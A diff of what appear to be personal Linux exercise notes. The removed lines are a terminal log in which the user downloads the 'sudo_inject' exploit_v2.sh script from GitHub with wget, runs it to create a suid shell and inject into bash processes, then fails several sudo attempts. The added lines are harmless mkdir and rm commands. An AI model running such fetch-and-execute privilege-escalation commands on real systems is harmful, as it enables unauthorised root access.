@@ -477,51 +477,11 @@ Run the routine and install `vim`.
 
 ___________________________________________________________________________________________________________________________________________________________________________________
 
-ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ cd /tmp
-ick@DESKTOP-F0EDLD6:/tmp$ wget https://raw.githubusercontent.com/nongiach/sudo_inject/refs/heads/master/exploit_v2.sh
---2025-04-15 23:13:51--  https://raw.githubusercontent.com/nongiach/sudo_inject/refs/heads/master/exploit_v2.sh
-Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
-Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 493 [text/plain]
-Saving to: ‘exploit_v2.sh’
-
-exploit_v2.sh                                        100%[===================================================================================================================>]     493  --.-KB/s    in 0s
-
-2025-04-15 23:13:51 (5.16 MB/s) - ‘exploit_v2.sh’ saved [493/493]
-
-ick@DESKTOP-F0EDLD6:/tmp$ chmod +x exploit_v2.sh
-ick@DESKTOP-F0EDLD6:/tmp$ ./exploit_v2.sh
-Creating suid shell in /tmp/sh
-Current process : 741
-Injecting process 377 -> bash
-Injecting process 540 -> bash
-Injecting process 688 -> bash
-ick@DESKTOP-F0EDLD6:/tmp$ sudo -i
-[sudo] password for ick:
-
-
-
-kpöikjoSorry, try again.
-[sudo] password for ick:
-
-Sorry, try again.
-[sudo] password for ick:
-j
-sudo: 3 incorrect password attempts
-ick@DESKTOP-F0EDLD6:/tmp$ j
-j: command not found
-ick@DESKTOP-F0EDLD6:/tmp$ ./exploit_v2.sh
-Creating suid shell in /tmp/sh
-Current process : 769
-Injecting process 377 -> bash
-Injecting process 540 -> bash
-Injecting process 688 -> bash
-ick@DESKTOP-F0EDLD6:/tmp$ sodo-i
-sodo-i: command not found
-ick@DESKTOP-F0EDLD6:/tmp$ sudo -i
-[sudo] password for ick:
-
+nick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ mkdir newfile
+nick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ cd newfile
+nick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick/newfile$ cd ..
+nick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ rm -rf newfile
+nick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$
 ___________________________________________________________________________________________________________________________________________________________________________________
 
 ### Task 11: Manipulating Files
